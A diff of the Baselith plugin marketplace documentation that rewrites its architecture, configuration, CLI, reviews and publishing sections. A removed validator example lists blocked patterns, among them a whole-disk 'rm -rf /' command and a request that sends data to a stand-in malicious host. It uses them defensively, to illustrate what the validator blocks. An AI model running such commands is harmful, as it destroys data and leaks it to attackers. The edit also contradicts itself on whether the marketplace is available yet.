@@ -3,7 +3,8 @@ title: Marketplace
 description: Publish and distribute plugins
 ---
 
-
+!!! warning "Coming Soon"
+    The **Centralized Marketplace** and **Plugin Registry** are currently under heavy development and are not yet available for public use. The documentation below reflects the intended architecture and upcoming features.
 
 The **Plugin Marketplace** is the ecosystem for distributing, discovering, and installing plugins. It enables developers to share extensions and allows users to enrich their system with verified additional capabilities.
 
@@ -12,51 +13,38 @@ The **Plugin Marketplace** is the ecosystem for distributing, discovering, and i
     - **Users**: Find and install verified plugins with a single click.
     - **Organizations**: Share internal plugins via a private registry.
 
+!!! tip "Native in Core"
+    Marketplace discovery and installation are now core framework features. You can browse and install plugins instantly on any Baselith installation.
+
 !!! tip "CLI First"
-    While a Python API is available, most users find the **CLI Marketplace Commands** provide the most efficient and robust way to manage plugins. Use `baselith plugin search/install` for your daily operations.
+    While a Python API is available, most users find the **CLI Marketplace Commands** provide the most efficient way to manage plugins. Use `baselith plugin marketplace search/install` for your daily operations.
 
 ---
 
 ## Architecture
 
-The Marketplace system consists of three primary components:
+The Marketplace follows a **Hub-and-Edge** architecture where a central server (the Hub) manages the registry of available plugins, and individual Baselith instances (the Edges) discover and install them.
 
-```mermaid
-flowchart LR
-    subgraph Developer["Developer"]
-        D1[Plugin Source]
-        D2[Package Command]
-    end
-    
-    subgraph Registry["Plugin Registry"]
-        R1[(Package Storage)]
-        R2[Metadata Index]
-        R3[Security Scanner]
-    end
-    
-    subgraph User["User System"]
-        U1[Installer]
-        U2[Plugin Manager]
-        U3[Running Plugins]
-    end
-    
-    D1 --> D2
-    D2 --> R1
-    R1 --> R2
-    R1 --> R3
-    
-    U1 --> R2
-    R2 --> U1
-    U1 --> U2
-    U2 --> U3
-```
+- **Central Hub**: Hosts verified plugin metadata and ZIP artifacts (on S3).
+- **Client Edge**: Your local installation that communicates with the hub to manage extensions.
 
-| Component     | Module                             | Function                             |
-| :------------ | :--------------------------------- | :----------------------------------- |
-| **Registry**  | `core/marketplace/registry.py`     | Centralized plugin catalog           |
-| **Installer** | `core/marketplace/installer.py`    | Download and installation management |
-| **Validator** | `core/marketplace/validator.py`    | Security and structure validation    |
-| **Publisher** | `plugins/marketplace/publisher.py` | Publishing and update logic          |
+---
+
+## Configuration
+
+For most users, the default client configuration is sufficient.
+
+| Variable                  | Description                      | Default                                           |
+| :------------------------ | :------------------------------- | :------------------------------------------------ |
+| `MARKETPLACE_MODE`        | `server` or `client`             | `client`                                          |
+| `MARKETPLACE_CENTRAL_URL` | URL of the central registry      | `https://marketplace.baselithcore.xyz/api/marketplace/plugins/registry.json` |
+| `MARKETPLACE_AUTH_URL`    | URL of the authentication portal | `https://marketplace.baselithcore.xyz`            |
+| `MARKETPLACE_API_KEY`     | Optional key for client auth     | `None`                                            |
+
+!!! info "Advanced Setup"
+    If you wish to host your own private registry or learn about server-side environment variables, please refer to the [Marketplace Plugin Repository](https://github.com/baselithcore/baselithcore-marketplace-plugin).
+
+---
 
 ---
 
@@ -68,16 +56,16 @@ The most common way to interact with the Plugin Marketplace is through the Basel
 
 ```bash
 # 1. Search for a plugin
-baselith plugin search agent
+baselith plugin marketplace search agent
 
 # 2. Get details
-baselith plugin info weather-agent
+baselith plugin marketplace info weather-agent
 
 # 3. Install
-baselith plugin install weather-agent
+baselith plugin marketplace install weather-agent
 
 # 4. Check for updates
-baselith plugin update weather-agent
+baselith plugin marketplace update weather-agent
 ```
 
 ---
@@ -111,8 +99,11 @@ for plugin in results:
 ### Plugin Details
 
 ```python
-# Get complete information about a plugin
+# Get complete information about a plugin (latest version)
 plugin_info = await registry.get("weather-agent")
+
+# Get a specific version
+plugin_v1 = await registry.get("weather-agent", version="1.0.0")
 
 print(f"Name: {plugin_info.name}")
 print(f"Description: {plugin_info.description}")
@@ -121,11 +112,7 @@ print(f"Downloads: {plugin_info.downloads}")
 print(f"Rating: {plugin_info.rating}")
 print(f"Updated: {plugin_info.updated_at}")
 print(f"Dependencies: {plugin_info.dependencies}")
-print(f"Min Framework Version: {plugin_info.min_framework_version}")
-
-# Version changelog
-for version in plugin_info.versions:
-    print(f"  {version.number}: {version.summary}")
+print(f"Required Resources: {plugin_info.required_resources}")
 ```
 
 ### Available Categories
@@ -233,117 +220,63 @@ The validator runs a series of automated checks:
 | Check            | Type     | Description                                    |
 | :--------------- | :------- | :--------------------------------------------- |
 | **Structure**    | Required | Mandatory files and directories must exist     |
-| **Metadata**     | Required | `manifest.json` must be valid and complete     |
+| **Metadata**     | Required | `manifest.yaml` (preferred) or `json`          |
 | **Imports**      | Security | No imports of dangerous modules                |
 | **System Calls** | Security | No `os.system()`, `subprocess`, etc.           |
 | **Network**      | Security | Detection of calls to suspicious IPs/hosts     |
 | **Dependencies** | Compat   | Dependencies must be compatible with framework |
 | **Syntax**       | Quality  | Python code must be syntactically correct      |
-| **Types**        | Quality  | Presence of type hints (recommended)           |
+| **Metadata Ext** | Quality  | Robust AST parsing for Python-embedded meta    |
 
-### Detected Dangerous Patterns
+### User Reviews & Ratings
+
+Users can submit reviews and ratings for plugins. Reviews are synchronized between the client and the central hub.
 
 ```python
-# ❌ These patterns will cause validation failure:
+# Fetch reviews for a plugin
+reviews = await registry.get_reviews("weather-agent", limit=5)
 
-import subprocess  # Blocked: Shell access
-import os
-os.system("rm -rf /")  # Blocked: System command
+for r in reviews:
+    print(f"[{r.rating}/5] {r.user_id}: {r.comment}")
 
-import requests
-requests.get("http://malicious.com/collect")  # Warning: Suspicious URL
+# Submit a review (requires authentication in Client mode)
+from plugins.marketplace.models import PluginReview
 
-eval(user_input)  # Blocked: Code execution
-exec(code)  # Blocked: Code execution
-
-__import__("dangerous")  # Blocked: Dynamic import
+new_review = PluginReview(
+    plugin_id="weather-agent",
+    rating=5,
+    comment="Excellent agent, very accurate!"
+)
+await registry.add_review(new_review)
 ```
 
 ---
 
 ## Publishing
 
-Follow this workflow to publish a plugin to the Marketplace.
+### 1. Authentication
 
-### 1. Preparation
-
-Ensure your plugin directory has all required files:
-
-```text
-my-plugin/
-├── plugin.py           # Entry point (Required)
-├── manifest.json       # Metadata (Required)
-├── README.md           # Documentation (Required)
-├── CHANGELOG.md        # Version history
-├── requirements.txt    # Python dependencies
-└── tests/              # Test suite (Recommended)
-```
-
-### 2. Configure `manifest.json`
-
-```json title="manifest.json"
-{
-  "name": "my-awesome-plugin",
-  "version": "1.0.0",
-  "description": "A plugin that does incredible things",
-  "author": "Your Name <you@example.com>",
-  "license": "MIT",
-  "homepage": "https://github.com/you/my-plugin",
-  "repository": "https://github.com/you/my-plugin",
-  "keywords": ["example", "demo", "utility"],
-  "category": "utility",
-  "min_framework_version": "1.0.0",
-  "dependencies": {
-    "python": ["httpx>=0.25", "pydantic>=2.0"],
-    "plugins": ["base-utilities@^1.0"]
-  },
-  "capabilities": ["agent", "router"]
-}
-```
-
-### 3. Validation
+Developers must authenticate using their GitHub account to publish plugins. This establishes ownership and trust.
 
 ```bash
-# Validate before publishing
-baselith plugin validate my-plugin
+baselith plugin marketplace login
 ```
 
-### 4. Packaging
+This will open your browser to GitHub. After authorization, the CLI receives a **JWT Token** used for subsequent `publish` commands.
 
-```bash
-# Create a distributable package
-baselith plugin package my-plugin --output dist/
-```
+### 2. Preparation
 
-**Output:**
+...
 
-```text
-✅ Validating plugin...
-✅ Running tests...
-✅ Building package...
-✅ Package created: dist/my-awesome-plugin-1.0.0.tar.gz
-```
+### 4. Submission & Scanning
 
-### 5. Publishing
+When you run `baselith plugin marketplace publish`, the Hub performs:
 
-```bash
-# Publish to the registry
-baselith plugin publish my-plugin \
-  --registry https://registry.example.com \
-  --api-key YOUR_API_KEY
-```
-
-**Output:**
-
-```text
-✅ Uploading package...
-✅ Verifying signature...
-✅ Running security scan...
-✅ Indexing metadata...
-✅ Published: my-awesome-plugin v1.0.0
-
-View at: https://registry.example.com/plugins/my-awesome-plugin
-```
+1. **Rate Limiting Check**: Prevents spamming the registry.
+2. **Payload Validation**: Ensures the ZIP is under 20MB (streamed for efficiency).
+3. **Advanced Extraction**: Metadata is extracted from `manifest.yaml` or via AST parsing of `plugin.py`.
+4. **Bandit Security Scan**: Rejects any code with high/medium security risks (e.g., shell injection).
+5. **Artifact Storage**: Saves the plugin to S3 and generates versioned metadata in PostgreSQL.
 
 ---
 
@@ -399,33 +332,6 @@ baselith plugin deprecate my-plugin@1.0.0 \
 ### 3. Communication
 
 The system automatically notifies users who have installed deprecated versions.
-
----
-
-## Private Registry
-
-For organizations requiring an internal registry:
-
-### Setup
-
-```bash
-# Docker compose for private registry
-docker compose -f docker-compose.registry.yml up -d
-```
-
-### Client Configuration
-
-```env
-PLUGIN_REGISTRY_URL=https://internal-registry.company.com
-PLUGIN_REGISTRY_API_KEY=internal-api-key
-```
-
-### Internal Publishing
-
-```bash
-baselith plugin publish my-internal-plugin \
-  --registry https://internal-registry.company.com
-```
 
 ---
 
